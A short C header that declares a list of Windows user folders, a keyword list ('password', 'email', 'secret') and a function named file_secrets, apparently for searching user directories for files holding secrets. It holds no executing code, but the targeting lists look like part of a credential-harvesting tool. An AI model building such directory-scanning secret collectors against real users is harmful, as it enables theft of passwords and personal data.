#ifndef DIRPROCESS_H
#define DIRPROCESS_H

static const char *userdir[] = {"Documents", "Desktop", "Music", "Downloads", "Favorites", "Contacts", "OneDrive", "Pictures", "Videos"};
static const int userdir_count = sizeof(userdir) / sizeof(userdir[0]);

static const char *n_secrets[] = {"password", "passwords", "email", "emails", "secret", "secrets"};
static const int secrets_count = sizeof(n_secrets) / sizeof(n_secrets[0]);

void file_secrets(const char *base_path);

#endif
